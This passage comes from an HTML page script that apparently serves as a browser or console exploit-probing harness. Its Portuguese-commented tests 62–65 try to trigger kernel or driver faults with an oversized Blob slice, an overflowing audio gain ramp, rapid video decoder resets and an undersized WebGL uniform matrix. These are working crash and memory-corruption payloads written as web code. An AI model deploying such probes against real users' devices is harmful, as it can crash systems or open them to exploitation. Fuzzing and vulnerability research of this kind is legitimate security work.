                log("Drawcall com Stride corrompido enviada.", "success");
            } catch(e) { log("GL Error: " + e, "info"); }
        }

        // 62. Blob Slice Integer Wrap (VFS Driver)
        // Tenta criar um Blob Slice onde start + length excede 2^53 (Max Safe Integer).
        // Testa se o sistema de arquivos virtual (libkernel) usa int64 corretamente.
        function runTest62() {
            log("Testando VFS Offset Wrap...", "danger");
            try {
                const b = new Blob(["A"]);
                // start = MaxSafeInteger, end = MaxSafeInteger + 10
                // Se o kernel usar 32-bit signed, isso vira negativo.
                const slice = b.slice(9007199254740991, 9007199254741001);
                
                const fr = new FileReader();
                fr.readAsArrayBuffer(slice); // Leitura dispara o cálculo no driver
                log("Blob Slice gigante requisitado.", "success");
            } catch(e) { log("Erro Blob: " + e, "info"); }
        }

        // 63. AudioParam Ramp Math (DSP Panic)
        // Automação de áudio usa interpolação no Kernel.
        // Pedir para ir de 0 a 1E38 em 0.00001 segundos gera valores intermédios impossíveis.
        function runTest63() {
            log("DSP Math Panic (ExponentialRamp)...", "danger");
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            
            // Valores que causam Overflow em Float32
            try {
                gain.gain.setValueAtTime(0.00001, ctx.currentTime);
                // Exponencial para infinito em tempo quase zero
                gain.gain.exponentialRampToValueAtTime(1e38, ctx.currentTime + 0.001);
                log("Comando de Rampa Exponencial enviado.", "success");
            } catch(e) { log(e, "info"); }
        }

        // 64. Video Resolution Switch (Decoder Memory Race)
        // Troca rapidamente entre vídeos de resoluções extremas (SD -> 4K -> SD).
        // Tenta pegar o alocador de memória de vídeo num estado intermediário.
        function runTest64() {
            log("Video Decoder Resolution Trashing...", "danger");
            const v = document.createElement('video');
            v.autoplay = true;
            v.muted = true;
            
            // Simula troca de source (Blob URLs vazias para forçar reset do decoder)
            let toggle = false;
            let i = setInterval(() => {
                // Alterna resoluções lógicas (metafórico para o driver)
                v.width = toggle ? 3840 : 320; 
                v.height = toggle ? 2160 : 240;
                // Force reload
                v.load();
                toggle = !toggle;
            }, 10); // Muito rápido
            
            setTimeout(() => { clearInterval(i); log("Teste de Resolução finalizado.", "info"); }, 2000);
        }

        // 65. WebGL Uniform Matrix OOB
        // Envia dados insuficientes para uma matriz 4x4 no shader.
        // O driver espera 16 floats. Se passarmos menos e ele ler, lê lixo da memória.
        function runTest65() {
            log("Uniform Matrix Data Underflow...", "danger");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "uniform mat4 m; void main() { gl_Position = m * vec4(0,0,0,1); }");
            gl.compileShader(vs);
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fs, "void main() { gl_FragColor = vec4(1); }");
            gl.compileShader(fs);
            const p = gl.createProgram();
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p);
            gl.useProgram(p);
            
            const loc = gl.getUniformLocation(p, "m");
            
            // Matriz 4x4 precisa de 16 floats.
            // Passamos array de 0 elementos ou tamanho errado.
            try {
                // Alguns drivers não checam o tamanho do array JS antes de copiar para C++
                gl.uniformMatrix4fv(loc, false, new Float32Array(8)); // Metade do necessário
                log("Matriz incompleta enviada para o Driver.", "success");
            } catch(e) { log("GL Error: " + e, "info"); }
        }

    

    </script>
</body>
</html>